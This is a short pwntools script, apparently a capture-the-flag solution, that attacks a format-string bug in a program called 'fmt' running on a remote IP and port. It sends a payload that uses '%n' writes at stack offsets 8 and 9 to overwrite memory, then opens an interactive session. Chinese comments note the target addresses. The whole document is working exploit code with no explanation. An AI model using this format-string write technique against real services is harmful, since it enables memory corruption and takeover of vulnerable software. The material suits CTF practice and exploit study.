from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#p = process('./fmt')
p = remote('43.249.195.138', 21181)

p.recvuntil('> ')

# 写入的起始地址为("\%9$p")
# 目标地址:("\%8$p") ("\%9$p")
payload = b'%18c%8$n'
payload += b'%34c%9$n'

p.send(payload)
p.interactive()
